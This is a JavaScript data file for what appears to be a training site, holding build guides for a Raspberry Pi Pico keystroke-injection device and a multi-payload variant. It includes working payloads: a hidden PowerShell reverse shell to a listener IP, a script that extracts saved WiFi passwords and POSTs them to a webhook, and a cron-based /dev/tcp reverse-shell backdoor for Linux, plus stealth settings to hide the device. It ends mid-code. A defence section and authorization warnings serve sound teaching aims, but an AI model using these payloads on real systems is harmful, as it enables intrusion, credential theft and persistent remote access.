// ============================================================================
// Signal Red Team Hardware — Build Guides (sg-33 through sg-42)
// Offensive security hardware builds for cybersecurity students
// ============================================================================

window.SignalGuides = {

    // ========================================================================
    // SG-33: USB Rubber Ducky Clone
    // ========================================================================
    'sg-33': {
        intro: '<p>The USB Rubber Ducky by Hak5 is one of the most iconic offensive security tools ever made. It looks like a normal USB flash drive, but when plugged in, it identifies as a <strong>keyboard</strong> (HID device) and types pre-programmed keystrokes at superhuman speed. It can open a terminal, download malware, exfiltrate data, or change system settings &mdash; all in under 5 seconds.</p>' +
               '<p>The commercial Rubber Ducky costs ~$80. We are building a functionally identical clone using a <strong>Raspberry Pi Pico</strong> ($4) running CircuitPython. Same attack vector, same speed, same capability &mdash; for 5% of the price.</p>' +
               '<p>This is the foundational red team hardware project. Every project that follows builds on the HID injection concept you learn here. Understanding how USB HID attacks work is essential for both offense (penetration testing) and defense (endpoint hardening).</p>' +
               '<p><strong>Hardware needed:</strong> Raspberry Pi Pico, USB Micro-B cable. That is it. Total cost: ~$4.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '</defs>' +
            '<rect width="720" height="300" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="280" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">USB RUBBER DUCKY CLONE &mdash; NO WIRING REQUIRED</text>' +
            '<!-- Pico board -->' +
            '<g class="svg-component">' +
            '<rect x="220" y="60" width="280" height="120" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="220" y="60" width="280" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<rect x="220" y="76" width="280" height="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="360" y="77" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">RASPBERRY PI PICO</text>' +
            '<rect x="340" y="48" width="40" height="16" rx="3" fill="#2a2a3a" stroke="#555" stroke-width="1"/>' +
            '<text x="360" y="59" text-anchor="middle" fill="#666" font-size="7">USB</text>' +
            '<text x="360" y="105" text-anchor="middle" fill="#8b949e" font-size="9">RP2040 &mdash; Dual-core ARM Cortex-M0+</text>' +
            '<text x="360" y="120" text-anchor="middle" fill="#8b949e" font-size="9">Runs CircuitPython + adafruit_hid</text>' +
            '<text x="360" y="135" text-anchor="middle" fill="#8b949e" font-size="9">Enumerates as USB HID Keyboard</text>' +
            '<text x="360" y="155" text-anchor="middle" fill="#ef4444" font-size="8">No external components needed</text>' +
            '</g>' +
            '<!-- Attack flow -->' +
            '<text x="360" y="210" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">ATTACK FLOW</text>' +
            '<rect x="60" y="225" width="120" height="40" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="0.5"/>' +
            '<text x="120" y="242" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">Plug In</text>' +
            '<text x="120" y="255" text-anchor="middle" fill="#555" font-size="6">USB Enumeration</text>' +
            '<line x1="180" y1="245" x2="220" y2="245" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<polygon points="220,241 228,245 220,249" fill="#ef4444" opacity="0.6"/>' +
            '<rect x="228" y="225" width="120" height="40" rx="5" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="0.5"/>' +
            '<text x="288" y="242" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">HID Recognized</text>' +
            '<text x="288" y="255" text-anchor="middle" fill="#555" font-size="6">OS trusts keyboard</text>' +
            '<line x1="348" y1="245" x2="388" y2="245" stroke="#eab308" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<polygon points="388,241 396,245 388,249" fill="#eab308" opacity="0.6"/>' +
            '<rect x="396" y="225" width="120" height="40" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="456" y="242" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">Payload Executes</text>' +
            '<text x="456" y="255" text-anchor="middle" fill="#555" font-size="6">Keystrokes typed</text>' +
            '<line x1="516" y1="245" x2="556" y2="245" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<polygon points="556,241 564,245 556,249" fill="#22c55e" opacity="0.6"/>' +
            '<rect x="564" y="225" width="120" height="40" rx="5" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="0.5"/>' +
            '<text x="624" y="242" text-anchor="middle" fill="#a855f7" font-size="8" font-weight="600">Objective Met</text>' +
            '<text x="624" y="255" text-anchor="middle" fill="#555" font-size="6">~3-5 seconds total</text>' +
            '</svg>' +
            '</div>',

        wiring: '    NO WIRING REQUIRED\n' +
                '\n' +
                '    This is a firmware-only build.\n' +
                '    The Raspberry Pi Pico connects directly to the\n' +
                '    target machine via its built-in USB port.\n' +
                '\n' +
                '    WHAT YOU NEED:\n' +
                '    +--------------------------------------------------+\n' +
                '    |  1x Raspberry Pi Pico (RP2040)            ~$4    |\n' +
                '    |  1x USB Micro-B cable                     ~$2    |\n' +
                '    |  1x Computer for firmware setup                   |\n' +
                '    +--------------------------------------------------+\n' +
                '\n' +
                '    HOW IT WORKS:\n' +
                '    The Pico enumerates as a USB HID (Human Interface\n' +
                '    Device) keyboard. The OS trusts it immediately\n' +
                '    because keyboards require no drivers. The payload\n' +
                '    script types pre-programmed keystrokes at ~1000\n' +
                '    characters per second.',

        wiringNotes: '<p><strong>Why the Pico?</strong> The RP2040 chip has native USB support with programmable USB descriptors. Unlike Arduino boards that use a separate USB-to-serial chip, the Pico\'s USB is handled directly by the main processor &mdash; giving you full control over how it identifies to the host OS.</p>' +
                     '<p><strong>HID vs Mass Storage:</strong> When the Pico enumerates as a keyboard (HID), the OS trusts it immediately. No driver installation, no user prompts, no UAC dialogs. This is the core vulnerability that makes Rubber Ducky attacks possible &mdash; operating systems implicitly trust human interface devices.</p>' +
                     '<p><strong>Detection window:</strong> The entire attack takes 3-5 seconds. By the time a user notices something happened, the payload has already executed. Physical access = game over.</p>',

        steps: [
            {
                title: 'Install CircuitPython on the Pico',
                content: '<p>CircuitPython is a beginner-friendly Python implementation that runs directly on microcontrollers. It turns the Pico into a drag-and-drop development environment &mdash; no compiler, no IDE, no toolchain needed.</p>' +
                         '<ol>' +
                         '<li>Download the latest CircuitPython UF2 file for the Raspberry Pi Pico from <code>circuitpython.org/board/raspberry_pi_pico/</code>.</li>' +
                         '<li>Hold the <strong>BOOTSEL</strong> button on the Pico while plugging it into your computer via USB.</li>' +
                         '<li>The Pico appears as a USB drive named <strong>RPI-RP2</strong>.</li>' +
                         '<li>Drag the <code>.uf2</code> file onto the RPI-RP2 drive. The Pico will reboot automatically.</li>' +
                         '<li>After reboot, the Pico reappears as a drive named <strong>CIRCUITPY</strong>. CircuitPython is installed.</li>' +
                         '</ol>',
                code: '# Verify CircuitPython is running:\n# Open a serial terminal (PuTTY, screen, or Thonny)\n# at 115200 baud on the Pico\'s COM port.\n# You should see the CircuitPython REPL:\n\n# Adafruit CircuitPython 9.x.x on 2025-xx-xx; Raspberry Pi Pico with rp2040\n# >>>\n\n# Type this to verify:\nimport sys\nprint(sys.implementation)\n# Output: (name=\'circuitpython\', ...)',
                language: 'Python',
                tip: '<strong>Tip:</strong> If the CIRCUITPY drive does not appear after flashing, try a different USB cable. Many cheap cables are charge-only and do not carry data. A data-capable cable will have 4 wires; a charge-only cable has 2.'
            },
            {
                title: 'Install the HID Library',
                content: '<p>CircuitPython needs the <code>adafruit_hid</code> library to send keystrokes. This library implements the USB HID protocol &mdash; the same protocol used by every keyboard and mouse.</p>' +
                         '<ol>' +
                         '<li>Download the CircuitPython Library Bundle from <code>circuitpython.org/libraries</code>. Choose the bundle matching your CircuitPython version.</li>' +
                         '<li>Extract the ZIP file.</li>' +
                         '<li>From the extracted <code>lib/</code> folder, copy the entire <code>adafruit_hid</code> folder to the <code>lib/</code> folder on the CIRCUITPY drive.</li>' +
                         '</ol>' +
                         '<p>The CIRCUITPY drive should now look like:</p>',
                code: 'CIRCUITPY/\n  boot.py          # (we will create this)\n  code.py          # (we will create this - the payload)\n  lib/\n    adafruit_hid/\n      __init__.py\n      keyboard.py\n      keyboard_layout_us.py\n      keycode.py\n      mouse.py\n      consumer_control.py\n      consumer_control_code.py',
                language: 'Text',
                tip: '<strong>Tip:</strong> Only copy the <code>adafruit_hid</code> folder, not the entire library bundle. The Pico has limited storage (~1MB on CIRCUITPY), and you want room for your payloads.'
            },
            {
                title: 'Create the Boot Configuration',
                content: '<p>The <code>boot.py</code> file runs once at startup before <code>code.py</code>. We use it to disable the CIRCUITPY USB drive so the Pico appears ONLY as a keyboard to the target machine. This is critical for stealth &mdash; if a USB drive pops up alongside a keyboard, the target user will notice.</p>' +
                         '<p>We also add a safety mechanism: if GP15 is held LOW at boot (connected to GND with a jumper wire), the CIRCUITPY drive stays enabled so you can modify payloads. This is your "dev mode" switch.</p>',
                code: 'import storage\nimport board\nimport digitalio\n\n# Safety pin: connect GP15 to GND to enable CIRCUITPY drive\n# Leave GP15 floating (disconnected) for attack mode\ndev_mode = digitalio.DigitalInOut(board.GP15)\ndev_mode.direction = digitalio.Direction.INPUT\ndev_mode.pull = digitalio.Pull.UP\n\nif dev_mode.value:  # GP15 is HIGH (not grounded) = attack mode\n    # Disable CIRCUITPY drive - Pico appears as keyboard only\n    storage.disable_usb_drive()\n    # Optional: also disable serial console for full stealth\n    # import usb_cdc\n    # usb_cdc.disable()',
                language: 'Python',
                tip: '<strong>IMPORTANT:</strong> After saving <code>boot.py</code> with drive-disable enabled, you MUST connect GP15 to GND (with a jumper wire) before plugging in the Pico to edit files again. If you lock yourself out, hold BOOTSEL and re-flash CircuitPython to start fresh.'
            },
            {
                title: 'Write Your First Payload',
                content: '<p>The payload goes in <code>code.py</code>. This file runs automatically every time the Pico boots. Here is a basic "Hello World" payload that opens Notepad on Windows and types a message:</p>' +
                         '<p>This demonstrates the core attack pattern: <strong>open a program</strong> (Win+R or terminal shortcut), <strong>type a command</strong>, <strong>press Enter</strong>. Every Rubber Ducky payload follows this structure.</p>',
                code: 'import time\nimport board\nimport usb_hid\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\nfrom adafruit_hid.keycode import Keycode\n\n# Wait for the OS to recognize the keyboard\ntime.sleep(1)\n\nkbd = Keyboard(usb_hid.devices)\nlayout = KeyboardLayoutUS(kbd)\n\n# --- PAYLOAD: Open Notepad and type a message ---\n\n# Open Run dialog (Windows + R)\nkbd.send(Keycode.WINDOWS, Keycode.R)\ntime.sleep(0.5)\n\n# Type "notepad" and press Enter\nlayout.write("notepad\\n")\ntime.sleep(0.8)\n\n# Type a message in Notepad\nlayout.write("=== RUBBER DUCKY TEST ===\\n")\nlayout.write("If you can read this, HID injection works.\\n")\nlayout.write("This machine is vulnerable to USB keystroke attacks.\\n")\nlayout.write("Time to harden your endpoint security.\\n")\n\n# Release all keys (safety)\nkbd.release_all()',
                language: 'Python',
                tip: '<strong>Tip:</strong> The <code>time.sleep()</code> delays are essential. Without them, the Pico types faster than the OS can process, and keystrokes get dropped. 0.5s after opening Run and 0.8s for application launch are reliable on most machines. Slower machines may need longer delays.'
            },
            {
                title: 'Build a Reverse Shell Payload (Advanced)',
                content: '<p>A real penetration test payload does more than open Notepad. Here is a payload that opens PowerShell and executes a reverse shell &mdash; giving you remote command-line access to the target machine. This is the same technique used in real-world engagements.</p>' +
                         '<p><strong>IMPORTANT:</strong> Only use this on systems you own or have written authorization to test. Unauthorized use is a federal crime under the Computer Fraud and Abuse Act (CFAA).</p>',
                code: 'import time\nimport usb_hid\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\nfrom adafruit_hid.keycode import Keycode\n\ntime.sleep(1)\nkbd = Keyboard(usb_hid.devices)\nlayout = KeyboardLayoutUS(kbd)\n\n# Open PowerShell (hidden window)\nkbd.send(Keycode.WINDOWS, Keycode.R)\ntime.sleep(0.5)\nlayout.write("powershell -w hidden\\n")\ntime.sleep(1.5)\n\n# Download and execute payload from your C2 server\n# REPLACE 10.0.0.1 with your listener IP\n# REPLACE 4444 with your listener port\npayload = (\n    "$client = New-Object System.Net.Sockets.TCPClient"\n    "(\\"10.0.0.1\\",4444);"\n    "$stream = $client.GetStream();"\n    "[byte[]]$bytes = 0..65535|%{0};"\n    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"\n    "$data = (New-Object -TypeName System.Text.ASCIIEncoding)"\n    ".GetString($bytes,0,$i);"\n    "$sendback = (iex $data 2>&1 | Out-String);"\n    "$sendback2 = $sendback + \\"PS \\" + (pwd).Path + \\"$> \\";"\n    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"\n    "$stream.Write($sendbyte,0,$sendbyte.Length);"\n    "$stream.Flush()};$client.Close()"\n)\nlayout.write(payload + "\\n")\n\nkbd.release_all()\n\n# On your attack machine, start a listener first:\n# nc -lvnp 4444',
                language: 'Python',
                tip: '<strong>Lab setup:</strong> To test this safely, set up two VMs on an isolated virtual network. Run <code>nc -lvnp 4444</code> on your Kali VM (the listener), then plug the Pico into the Windows VM. You should get a shell within seconds.'
            },
            {
                title: 'Create a Payload Library',
                content: '<p>Serious operators maintain a library of payloads for different scenarios. Create a <code>payloads/</code> folder on the CIRCUITPY drive with scripts for common tasks. Modify <code>code.py</code> to select which payload to run based on a DIP switch or button.</p>' +
                         '<p>Here are useful payload templates to build:</p>' +
                         '<ul>' +
                         '<li><strong>WiFi Exfil:</strong> Open PowerShell, run <code>netsh wlan show profiles</code>, extract saved WiFi passwords, POST them to your server.</li>' +
                         '<li><strong>Reverse Shell:</strong> Establish remote access (shown in Step 5).</li>' +
                         '<li><strong>Credential Harvester:</strong> Open a fake Windows lock screen (HTML page) that captures the user\'s password.</li>' +
                         '<li><strong>Persistence:</strong> Add a registry run key or scheduled task that phones home on reboot.</li>' +
                         '<li><strong>Recon Only:</strong> Run <code>systeminfo</code>, <code>ipconfig</code>, <code>net user</code>, save output to a file on the Pico.</li>' +
                         '</ul>',
                code: '# Example: WiFi Password Exfiltration Payload\nimport time, usb_hid\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\nfrom adafruit_hid.keycode import Keycode\n\ntime.sleep(1)\nkbd = Keyboard(usb_hid.devices)\nlayout = KeyboardLayoutUS(kbd)\n\n# Open PowerShell hidden\nkbd.send(Keycode.WINDOWS, Keycode.R)\ntime.sleep(0.5)\nlayout.write("powershell -w hidden\\n")\ntime.sleep(1.5)\n\n# Extract all saved WiFi passwords and send to webhook\ncmd = (\n    "(netsh wlan show profiles) | "\n    "Select-String \\"\\\\:(.+)$\\" | "\n    "%{$name=$_.Matches.Groups[1].Value.Trim(); $_} | "\n    "%{(netsh wlan show profile name=\\"$name\\" key=clear)} | "\n    "Select-String \\"Key Content\\\\W+\\\\:(.+)$\\" | "\n    "%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | "\n    "%{[PSCustomObject]@{PROFILE=$name;PASSWORD=$pass}} | "\n    "ConvertTo-Json | "\n    "Invoke-WebRequest -Uri \\"https://YOUR-WEBHOOK/collect\\" "\n    "-Method POST -Body $_ -ContentType \\"application/json\\""\n)\nlayout.write(cmd + "\\n")\nkbd.release_all()',
                language: 'Python',
                tip: '<strong>Tip:</strong> For real engagements, use a Burp Collaborator or Interactsh URL as your webhook endpoint. These give you free, disposable callback URLs with automatic logging.'
            },
            {
                title: 'Defense: How to Detect and Prevent Rubber Ducky Attacks',
                content: '<p>Now that you understand how the attack works, here is how to defend against it:</p>' +
                         '<ul>' +
                         '<li><strong>USB Device Whitelisting:</strong> Use Group Policy or endpoint management (Intune, SCCM, CrowdStrike) to block unknown USB HID devices. Only allow keyboards and mice with known Vendor ID / Product ID combinations.</li>' +
                         '<li><strong>USB Port Blocking:</strong> Physically disable or epoxy unused USB ports on sensitive workstations. Use USB port blockers (physical plugs that require a key to remove).</li>' +
                         '<li><strong>Keystroke Injection Detection:</strong> Tools like <strong>Duckhunter</strong> and <strong>USBGuard</strong> (Linux) monitor for impossible typing speeds. No human types 1000+ characters per second.</li>' +
                         '<li><strong>User Training:</strong> Teach users never to plug in USB devices they did not purchase themselves. "Found USB" attacks (dropping infected drives in parking lots) have a 45-60% success rate in studies.</li>' +
                         '<li><strong>PowerShell Logging:</strong> Enable ScriptBlock Logging and Module Logging in Group Policy. Even if the payload executes, you will have a forensic record of exactly what it did.</li>' +
                         '<li><strong>Application Whitelisting:</strong> Use AppLocker or WDAC to prevent unauthorized executables. Even if the Ducky opens PowerShell, constrained language mode limits what it can do.</li>' +
                         '</ul>',
                code: '# Windows: Check for recently connected USB devices (PowerShell)\nGet-PnpDevice -Class USB | Where-Object { $_.Status -eq "OK" } |\n    Select-Object FriendlyName, InstanceId, Status |\n    Format-Table -AutoSize\n\n# Linux: Monitor USB device connections in real-time\n# Run this in a terminal to watch for new HID devices:\nsudo udevadm monitor --subsystem-match=usb --property\n\n# Linux: USBGuard - block unauthorized USB devices\nsudo apt install usbguard\nsudo usbguard generate-policy > /etc/usbguard/rules.conf\nsudo systemctl enable --now usbguard\n# Now only currently-connected devices are allowed.\n# New USB devices will be blocked by default.',
                language: 'Bash',
                tip: '<strong>Red vs Blue:</strong> Every tool in this section has two sides. Building the Ducky teaches you the attack. Defending against it teaches you the countermeasure. A good security professional knows both.'
            }
        ],

        testing: '<p>Verify your Rubber Ducky clone works correctly:</p>' +
                 '<ul>' +
                 '<li><strong>Safe test first:</strong> Use the Notepad payload (Step 4) on your own machine. Plug in the Pico and verify that Notepad opens and text appears within 3-5 seconds.</li>' +
                 '<li><strong>Check device enumeration:</strong> Open Device Manager (Windows) or <code>lsusb</code> (Linux). The Pico should appear as a HID Keyboard, not a storage device (unless GP15 is grounded for dev mode).</li>' +
                 '<li><strong>Timing check:</strong> If keystrokes are dropped or garbled, increase the <code>time.sleep()</code> delays. Different OS versions and hardware speeds need different timing.</li>' +
                 '<li><strong>Multi-OS test:</strong> Test on Windows 10, Windows 11, Ubuntu, and macOS. HID injection works on all of them, but keyboard shortcuts differ. <code>Keycode.WINDOWS</code> does not work on macOS &mdash; use <code>Keycode.COMMAND</code> instead.</li>' +
                 '<li><strong>Stealth check:</strong> With <code>boot.py</code> drive-disable active, verify that only a keyboard appears &mdash; no CIRCUITPY drive visible to the target machine.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'Charge-Only USB Cable',
                description: 'Many USB cables only carry power, not data. If the Pico does not appear as RPI-RP2 when BOOTSEL is held, try a different cable. Data cables have 4 internal wires; charge-only cables have 2.'
            },
            {
                title: 'Locked Out of CIRCUITPY',
                description: 'If boot.py disables the drive and you forgot to wire GP15, hold BOOTSEL and re-flash CircuitPython. This wipes the flash and gives you a clean CIRCUITPY drive.'
            },
            {
                title: 'Wrong Keyboard Layout',
                description: 'KeyboardLayoutUS sends US English keycodes. If the target has a different layout (UK, DE, FR), characters like @, #, and \\ will be wrong. Use the matching layout library from the CircuitPython bundle.'
            }
        ]
    },

    // ========================================================================
    // SG-34: Bad USB Multi-Payload Tool
    // ========================================================================
    'sg-34': {
        intro: '<p>The basic Rubber Ducky (SG-33) runs a single hardcoded payload. In a real penetration test, you need flexibility &mdash; different payloads for different targets, different operating systems, different objectives. You do not want to reflash the firmware every time.</p>' +
               '<p>This project upgrades your Pico into a <strong>multi-payload platform</strong> with a payload selector, LED status indicators, and a configuration system. Think of it as the difference between a single-shot pistol and a magazine-fed sidearm.</p>' +
               '<p>The commercial equivalent is the <strong>Hak5 Bash Bunny</strong> (~$120), which has a physical switch for payload selection. We replicate this with GPIO buttons and onboard LED feedback. You will also implement OS detection, allowing your device to automatically choose the right payload for Windows, macOS, or Linux.</p>' +
               '<p><strong>Hardware needed:</strong> Raspberry Pi Pico, 2 tactile buttons, 3 LEDs (red/green/blue), 3x 330-ohm resistors, breadboard, jumper wires. Total cost: ~$6.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 350" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '</defs>' +
            '<rect width="720" height="350" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="330" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">BAD USB MULTI-PAYLOAD &mdash; WIRING DIAGRAM</text>' +
            '<!-- Pico -->' +
            '<g class="svg-component">' +
            '<rect x="200" y="55" width="200" height="120" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="200" y="55" width="200" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="300" y="73" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">RASPBERRY PI PICO</text>' +
            '<text x="220" y="100" fill="#8b949e" font-size="8">GP10 &mdash; Btn SELECT</text>' +
            '<text x="220" y="115" fill="#8b949e" font-size="8">GP11 &mdash; Btn ARM</text>' +
            '<text x="220" y="130" fill="#8b949e" font-size="8">GP12/13/14 &mdash; LEDs R/G/B</text>' +
            '<text x="220" y="150" fill="#8b949e" font-size="8">GP15 &mdash; Dev Mode</text>' +
            '</g>' +
            '<!-- Buttons -->' +
            '<rect x="480" y="55" width="160" height="60" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="1"/>' +
            '<text x="560" y="75" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">SELECT + ARM Buttons</text>' +
            '<text x="560" y="92" text-anchor="middle" fill="#8b949e" font-size="7">Tactile switches to GND</text>' +
            '<text x="560" y="104" text-anchor="middle" fill="#8b949e" font-size="7">Internal pull-up on GPIO</text>' +
            '<!-- LEDs -->' +
            '<rect x="480" y="130" width="160" height="60" rx="6" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
            '<text x="560" y="150" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">Status LEDs</text>' +
            '<text x="560" y="167" text-anchor="middle" fill="#ef4444" font-size="7">RED = Armed</text>' +
            '<text x="560" y="179" text-anchor="middle" fill="#22c55e" font-size="7">GREEN = Ready</text>' +
            '<!-- Wires -->' +
            '<line x1="400" y1="85" x2="478" y2="85" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="400" y1="145" x2="478" y2="145" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<!-- Payload slots -->' +
            '<text x="360" y="210" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">PAYLOAD SLOTS</text>' +
            '<rect x="60" y="225" width="130" height="50" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="0.5"/>' +
            '<text x="125" y="248" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">Slot 1: Windows</text>' +
            '<text x="125" y="263" text-anchor="middle" fill="#555" font-size="7">Reverse Shell</text>' +
            '<rect x="210" y="225" width="130" height="50" rx="5" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="0.5"/>' +
            '<text x="275" y="248" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">Slot 2: macOS</text>' +
            '<text x="275" y="263" text-anchor="middle" fill="#555" font-size="7">Recon Script</text>' +
            '<rect x="360" y="225" width="130" height="50" rx="5" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="425" y="248" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">Slot 3: Linux</text>' +
            '<text x="425" y="263" text-anchor="middle" fill="#555" font-size="7">Cron Backdoor</text>' +
            '<rect x="510" y="225" width="140" height="50" rx="5" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="0.5"/>' +
            '<text x="580" y="248" text-anchor="middle" fill="#a855f7" font-size="9" font-weight="600">Slot 4: Auto-Detect</text>' +
            '<text x="580" y="263" text-anchor="middle" fill="#555" font-size="7">OS Fingerprint</text>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM\n' +
                '\n' +
                '    Raspberry Pi Pico Pinout:\n' +
                '    +--------------------------------------------------+\n' +
                '    |  GP10 ---[Button SELECT]--- GND                  |\n' +
                '    |  GP11 ---[Button ARM   ]--- GND                  |\n' +
                '    |  GP12 ---[330 ohm]--- RED LED   --- GND          |\n' +
                '    |  GP13 ---[330 ohm]--- GREEN LED --- GND          |\n' +
                '    |  GP14 ---[330 ohm]--- BLUE LED  --- GND          |\n' +
                '    |  GP15 ---[Jumper to GND for Dev Mode]            |\n' +
                '    +--------------------------------------------------+\n' +
                '\n' +
                '    Buttons use internal pull-up resistors.\n' +
                '    Press SELECT to cycle through payloads.\n' +
                '    LED color indicates selected payload.\n' +
                '    Press ARM to execute the selected payload.',

        wiringNotes: '<p><strong>Button debouncing:</strong> Mechanical buttons "bounce" when pressed, registering multiple rapid presses. The code handles this with a 200ms debounce delay. Without it, a single press might cycle through 3-4 payloads.</p>' +
                     '<p><strong>LED current limiting:</strong> Always use a 330-ohm resistor in series with each LED. Without it, the LED draws too much current from the GPIO pin and can damage the Pico. The resistor limits current to ~10mA, which is bright enough and safe for the RP2040.</p>' +
                     '<p><strong>Why two buttons?</strong> SELECT cycles the payload, ARM executes it. This prevents accidental execution &mdash; you must deliberately arm the device. In a real engagement, you select the payload before approaching the target machine.</p>',

        steps: [
            {
                title: 'Wire the Buttons and LEDs',
                content: '<p>Set up the breadboard with the Pico, two tactile buttons, and three LEDs:</p>' +
                         '<ol>' +
                         '<li>Place the Pico on the breadboard.</li>' +
                         '<li><strong>SELECT button:</strong> Connect one leg to GP10, the other to GND. The internal pull-up resistor keeps GP10 HIGH until the button is pressed.</li>' +
                         '<li><strong>ARM button:</strong> Connect one leg to GP11, the other to GND.</li>' +
                         '<li><strong>Red LED:</strong> GP12 &rarr; 330-ohm resistor &rarr; LED anode (long leg) &rarr; LED cathode (short leg) &rarr; GND.</li>' +
                         '<li><strong>Green LED:</strong> Same pattern on GP13.</li>' +
                         '<li><strong>Blue LED:</strong> Same pattern on GP14.</li>' +
                         '</ol>',
                code: null,
                language: null,
                tip: '<strong>Tip:</strong> If you do not have separate LEDs, the Pico has a built-in LED on GP25. You can use blink patterns instead of colors: 1 blink = payload 1, 2 blinks = payload 2, etc.'
            },
            {
                title: 'Build the Multi-Payload Framework',
                content: '<p>The framework loads payloads from separate files, provides a selection UI via buttons and LEDs, and handles execution with status feedback.</p>',
                code: 'import time\nimport board\nimport digitalio\nimport usb_hid\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\nfrom adafruit_hid.keycode import Keycode\n\n# ---- Hardware Setup ----\nkbd = Keyboard(usb_hid.devices)\nlayout = KeyboardLayoutUS(kbd)\n\n# Buttons (internal pull-up, active LOW)\nbtn_select = digitalio.DigitalInOut(board.GP10)\nbtn_select.direction = digitalio.Direction.INPUT\nbtn_select.pull = digitalio.Pull.UP\n\nbtn_arm = digitalio.DigitalInOut(board.GP11)\nbtn_arm.direction = digitalio.Direction.INPUT\nbtn_arm.pull = digitalio.Pull.UP\n\n# Status LEDs\nleds = []\nfor pin in [board.GP12, board.GP13, board.GP14]:\n    led = digitalio.DigitalInOut(pin)\n    led.direction = digitalio.Direction.OUTPUT\n    leds.append(led)\n\ndef set_led(r, g, b):\n    leds[0].value = r\n    leds[1].value = g\n    leds[2].value = b\n\n# ---- Payload Definitions ----\ndef payload_windows_revshell():\n    """Slot 1: Windows reverse shell via PowerShell"""\n    kbd.send(Keycode.WINDOWS, Keycode.R)\n    time.sleep(0.5)\n    layout.write("powershell -w hidden\\n")\n    time.sleep(1.5)\n    layout.write("# INSERT YOUR REVERSE SHELL HERE\\n")\n    kbd.release_all()\n\ndef payload_macos_recon():\n    """Slot 2: macOS system recon"""\n    kbd.send(Keycode.COMMAND, Keycode.SPACE)\n    time.sleep(0.5)\n    layout.write("Terminal\\n")\n    time.sleep(1)\n    layout.write("whoami; sw_vers; ifconfig | grep inet\\n")\n    kbd.release_all()\n\ndef payload_linux_backdoor():\n    """Slot 3: Linux cron persistence"""\n    kbd.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)\n    time.sleep(1)\n    layout.write("echo \'* * * * * /bin/bash -i >& "\n                 "/dev/tcp/10.0.0.1/4444 0>&1\' "\n                 "| crontab -\\n")\n    kbd.release_all()\n\ndef payload_auto_detect():\n    """Slot 4: Detect OS and run appropriate payload"""\n    # Try Windows first (Win+R), fall back to others\n    kbd.send(Keycode.WINDOWS, Keycode.R)\n    time.sleep(0.3)\n    layout.write("echo WINDOWS_DETECTED\\n")\n    kbd.release_all()\n\npayloads = [\n    ("WIN REVSHELL", payload_windows_revshell, (True, 